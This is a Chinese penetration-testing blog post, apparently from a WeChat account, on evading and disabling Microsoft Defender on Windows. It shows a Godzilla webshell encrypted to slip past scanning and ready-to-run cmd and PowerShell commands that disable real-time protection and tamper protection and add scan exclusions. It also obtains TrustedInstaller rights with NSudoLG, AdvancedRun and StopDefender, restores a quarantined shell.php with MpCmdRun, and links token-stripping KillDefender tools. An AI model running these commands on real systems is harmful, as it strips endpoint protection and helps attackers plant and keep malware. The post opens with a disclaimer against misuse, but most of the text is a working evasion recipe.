> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/W8fTA0gJTBtT_UjUa-HxUg)

声明：本人坚决反对利用文章内容进行恶意攻击行为，一切错误行为必将受到惩罚，绿色网络需要靠我们共同维护，推荐大家在了解技术原理的前提下，更好的维护个人信息安全、企业安全、国家安全。

Microsoft Defender 防病毒软件在 Windows 10 和 Windows 11 以及 Windows Server 版本中可用。  

Microsoft Defender 防病毒软件是 Microsoft Defender for Endpoint 中下一代保护的主要组件。这种保护将机器学习、大数据分析、深入的威胁防御研究和 Microsoft 云基础设施结合在一起，以保护您组织中的设备（或端点）。Microsoft Defender 防病毒软件内置于 Windows 中，它与 Microsoft Defender for Endpoint 配合使用，为你的设备和云提供保护。

_1_

被攻击目标操作系统环境

（1）defender 版本  

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib7MFbl1nO7onIyS5mBEQeR1GC0kjicDJrsF7UbYCNCIXRqOpzGC20viaA/640?wx_fmt=png)

（2）系统补丁信息

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qlmqaxS8oxYPyvLnP22lcuMmia0DgUlR62pmRMDE8icok7C8hrAcTQyW3LXibEo2A4IHOYhSHabibSQBQ/640?wx_fmt=jpeg)

（3）systeminfo 信息
----------------

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibmCCLh8ml2ia8kzTJhYr5tG5nwvEtSPgia4cM7D1uYMelRdVPcIljTA7g/640?wx_fmt=png)

_2_

攻击前的准备工作

web 环境：phpstudy 8.1.1.3 + apache 2.4.39 + php 7.3.4

经过测试，用 Godzilla 自带的`PHP_XOR_BASE64`加密器即可免杀（php 一句话直接杀），生成 PHP_XOR_BASE64 webshell

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibS07qdpJGN7sspjOdHoZTSJAibxhllBPxDGtwvYmZjPicH2uAGdM27iccw/640?wx_fmt=png)

### 静态免杀测试

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qlmqaxS8oxYPyvLnP22lcuMySMxm4FRpOYibfJBADl50wIzxgHibXPibg5pHpKGibPibxeEk4eiamNb1faQ/640?wx_fmt=jpeg)

### 连接 webshell

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qlmqaxS8oxYPyvLnP22lcuMFoibYWAcp7xD1YGbcramJeKJL2K5ic4xLH1ibl2ALWPEtyzsKEyrZtMug/640?wx_fmt=jpeg)

### 动态免杀测试

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qlmqaxS8oxYPyvLnP22lcuMmMGHaToChcoNezvFNibU0duRmAcHMPibno4drglQ1VeEP0aDFIqrp8bQ/640?wx_fmt=jpeg)

_3_

windows 命令介绍

cmd
---

```
#查看排除项
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions" /s
#查看版本
dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b
#查看篡改保护（返回结果中的 数值5代表开启，数值4代表关闭）
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection"
#需要TrustedInstaller权限
##cmd注册表关闭Windows defender
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f
##cmd关闭篡改保护
NSudoLG.exe -U:T cmd /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /d 4 /t REG_DWORD /f"
##cmd注册表恢复Windows defender
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 0 /f
##cmd添加Windows defender排除项
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\temp" /d 0 /t REG_DWORD /f
```

powershell
----------

```
#查看排除项
Get-MpPreference | select ExclusionPath
#关闭Windows defender
Set-MpPreference -DisableRealTimeMonitoring $true
#增加排除项
Add-MpPreference -ExclusionPath "c:\temp"
#删除排除项
Remove-MpPreference -ExclusionPath "C:\test"
#关闭实时保护
Set-MpPreference -DisableRealtimeMonitoring $true
```

_4_

命令行关闭 defender

TrustedInstaller 是从 Windows Vista 开始出现的一个内置安全主体，在 Windows 中拥有修改系统文件权限，本身是一个服务，以一个账户组的形式出现。它的全名是：NT SERVICE\TrustedInstaller

为什么要获取 TrustedInstaller 权限？说白了就是因为 **Administratior 权限**和 **system 权限**无法关闭 Windows defender

注意：以下**工具**和**技巧**皆需要 **Administratior 权限**才能成功使用

**（1）NSudoLG**
--------------

工具地址：https://github.com/M2Team/NSudo

下载后使用：

D:\Documents\NSudo_8.2_All_Components\NSudoLauncher\x64\NSudoLG.exe

### 免杀测试

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibt3yvnrULStKOaJ9rWiccFzkvMQgcdnrn8Wbc6v7hJ3pUTicsicAMkq9Vw/640?wx_fmt=png)

### 使用方法

注意：此工具的 -U:T 参数是获取了 TrustedInstaller 权限

```
#cmd注册表关闭Windows defender
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f
#cmd注册表恢复Windows defender
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 0 /f
#cmd添加Windows defender排除项
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\temp" /d 0 /t REG_DWORD /f
#NSudoLG.exe关闭Windows defender
NSudoLG.exe -U:T cmd /c "reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 1 /f"
#NSudoLG.exe恢复Windows defender
NSudoLG.exe -U:T cmd /c "reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t reg_dword /d 0 /f"
#NSudoLG.exe添加Windows defender排除项
NSudoLG.exe -U:T cmd /c "reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "c:\temp" /d 0 /t REG_DWORD /f"
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib1QVBlMItSKko8gRnmo8hlCZiaQPy7e8aruCEVhiakN9FquQM1vzmuebg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/lFOEJLHA9qlmqaxS8oxYPyvLnP22lcuMEmUBJvS6M3aibv3QgIJBeNFYWnBReyVwia1oJczT97iawiaku1wPsoIQmw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibrPL3pfdWjicBLvFgpxtDDiaWTibmo8URZZUcPK3SCzKWnBxRPkqJOeFDg/640?wx_fmt=png)

### powershell 成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibov0JCfmOWSUTwePLGcmD9jGWnUr0c9sK4rQASHQBCGnHWBbpqQ4gvA/640?wx_fmt=png)

**（2）AdvancedRun**
------------------

地址：https://www.nirsoft.net/utils/advanced_run.html

### 免杀测试

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibnJUfcP0iaQPbH4su3qzibSrDd5wdnwkZjVYecKEjAuHEZ4kcdUbCwichQ/640?wx_fmt=png)

### 使用方法

```
AdvancedRun.exe /EXEFilename "%windir%\system32\cmd.exe" /CommandLine '/c 
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /d 1 /t REG_DWORD /f' /RunAs 8 /Run
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibENPSFRsnJrMKqyQMNkmdOowFeZUKVGWr2iblPvVR5wBMlmSSU3mFW9Q/640?wx_fmt=png)

### powershell 成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibsxZShwOzRtAM1E0bO04MRHW8lmn7cZUSeTyLTg0eeAuH0M8rqqHiaibg/640?wx_fmt=png)

**（3）StopDefender**
-------------------

Github 地址：https://github.com/lab52io/StopDefender

### 免杀测试

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibicoczsVDYPsdEvh4plnaK8LI3LR5y4EsrU8GW5uiacTN3re8FpO9GfEQ/640?wx_fmt=png)

### 使用方法

```
StopDefender_x64.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibztM07ULoCb92WibOnicyb4xPZh6IRp5CdRPWpfn5h31pMW2TLD1G638Q/640?wx_fmt=png)

### powershell 成功上线

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib0aWDWQHd96TKYDllEmc8r4vPib4Oewe11xr2Z78JZSlf2srcAV8Y33g/640?wx_fmt=png)

powershell
----------

```
#查看排除项
Get-MpPreference | select ExclusionPath
#关闭Windows defender
Set-MpPreference -DisableRealTimeMonitoring $true
#增加排除项
Add-MpPreference -ExclusionPath "c:\temp"
#删除排除项
Remove-MpPreference -ExclusionPath "C:\test"
```

### 关闭 Windows defender

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibv1SWbAcX69ABGxpmiczaiasrlZ1VpTRCqJiboC8FTn8smNV4ecWHF0cdw/640?wx_fmt=png)

### 关闭 实时保护

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ib9fdRQvWdNz3hKVylicNmI6qqqMrsFWJegTt4lr5k4WptvUqpM32Cgog/640?wx_fmt=png)

### **（4）MpCmdRun 介绍**

配置和管理 Microsoft Defender 防病毒软件的命令行工具详情

https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/command-line-arguments-microsoft-defender-antivirus?view=o365-worldwide

MpCmdRun 的位置为：

`C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>`

```
#查看版本（查看<antimalware platform version>）
dir "C:\ProgramData\Microsoft\Windows Defender\Platform\" /od /ad /b
#验证
dir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2210.6-0\" | findstr MpCmdRun
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibP6G9lrU6iaMEAG4KveO6n6S7icjicp78pzdluoX4ib41xQ9icfewY0Tj5iag/640?wx_fmt=png)

### 基础命令

```
#查看被隔离的文件列表
MpCmdRun -Restore -ListAll
#恢复指定名称的文件至原目录
MpCmdRun -Restore -FilePath C:\phpstudy_pro\WWW\shell.php
#恢复所有文件至原目录
MpCmdRun -Restore -All
#查看指定路径是否位于排除列表中
MpCmdRun -CheckExclusion -path C:\phpstudy_pro\WWW\
```

移除 Token 导致 Windows Defender 失效
-------------------------------

Windows Defender 进程为 MsMpEng.exe,MsMpEng.exe 是一个受保护的进程 (Protected Process Light，简写为 PPL)

非 PPL 进程无法获取 PPL 进程的句柄，导致我们无法直接结束 PPL 进程 MsMpEng.exe, 但是我们能够以 SYSTEM 权限运行的线程修改进程 MsMpEng.exe 的 token, 当我们移除进程 MsMpEng.exe 的所有 token 后，进程 MsMpEng.exe 无法访问其他进程的资源，也就无法检测其他进程是否有害，最终导致 Windows Defender 失效。

**本人没有利用成功过**

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTrdaGvjLmicOibKwFZcJwEs1ibtkiafw8dwULib18PRaKj3o1pXElJ95chqV6XI4Yic2bPQNJmDoHBnJOPg/640?wx_fmt=png)

### 工具地址

https://github.com/pwn1sher/KillDefender

https://github.com/Octoberfest7/KillDefender

https://github.com/Octoberfest7/KDStab

参考文章
====

[https://mp.weixin.qq.com/s/27rvHpsnldnxpJaxwQrLGw](https://mp.weixin.qq.com/s?__biz=MzA5NDYyNDI0MA==&mid=2651958154&idx=1&sn=d32b9c6067d36f212dfb1d2362f807db&scene=21#wechat_redirect)

https://zhuanlan.zhihu.com/p/538571344

https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-Windows-Defender

https://cloud.tencent.com/developer/article/1870239

-END-  

▎经典文章精选

[神兵利器 | 自动化钉钉推送主机端口信息！](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247502155&idx=1&sn=50364710204c6260aa47a1fb327858be&chksm=cf4e462af839cf3c3481b5a3c3e03e330fd69f8490d73aeaf40e21d7addf4470a0b571cfd1e2&scene=21#wechat_redirect)  

[神兵利器 | DayBreak 安装与使用](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247503052&idx=1&sn=82fdbac1190e11659ddedd3afcdfec35&chksm=cf4e43adf839cabbb55a6061f6efe82dc935402db0c099c1e8cd8705e64d5fea10c0f9ca062b&scene=21#wechat_redirect)  

[权限提升 | suid 提权及修复方式](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247502046&idx=1&sn=c6ad031c69044103cafabff4ed842430&chksm=cf4e47bff839cea9107c5027dc42c3aec754de79f41b32decdeb8f9a1894dd8ce86c133a257f&scene=21#wechat_redirect)  

[靶场攻略 | vulhub_DC6](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247502016&idx=1&sn=ac767e1534245964d83c5a701376f783&chksm=cf4e47a1f839ceb7f17c7d294ee32879ab9b581ad49b50dc3002cad03f268fb78ab33bb494ae&scene=21#wechat_redirect)  

[安全攻防 | frp 内网穿透](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247501994&idx=1&sn=4fb0bea2631ccbd02ce39f9b88429892&chksm=cf4e47cbf839cedd61ebae190cbf5244b81d362b7c854ca2f8a747312790d00c14bb2ef803c1&scene=21#wechat_redirect)  

[环境搭建 | CTFd 动态靶机搭建笔记](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247501383&idx=1&sn=62ed7492987953f2c3e4ec51dbd82be7&chksm=cf4e4926f839c0302584cac023af1085fb7dc4466d6ccb767aa539dc3d9ffe59414edd00a271&scene=21#wechat_redirect)  

[环境搭建 | 手动搭建域环境](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247501359&idx=1&sn=7231a0e72bbffba796b60276d710b050&chksm=cf4e494ef839c058fb60b5c25eb23ec8506138faadcd78462d0855d40e3bdfb27716922088c6&scene=21#wechat_redirect)  

[环境搭建 | 手动搭建 K8S 环境](http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247501102&idx=1&sn=079ba0b0fca0d8c821278c756cfe34fc&chksm=cf4e4a4ff839c3596d73436dbe52d31a66f405c9a377cca60431b2825e1934cad24de638b676&scene=21#wechat_redirect)  

![](https://mmbiz.qpic.cn/mmbiz_png/ZuFicpjuU1pVkyLMYbywRQy6HCx0UvFn9N82n3IwDzaD4y0nmBERNsAVmmsiaDWpmXibOTqNUTrpHvKZDlbDlyy6w/640?&wx_fmt=png)

扫描下方 **二维码** 加入我们吧！

![](https://mmbiz.qpic.cn/mmbiz_png/lFOEJLHA9qnMic5vNBbLrHggmjx0S0JVtibZSI1wQI9tEliaT6ac5I1Ofq6jibvYJN6xsuW5NueGrPa2ymiauNz52lw/640?wx_fmt=png)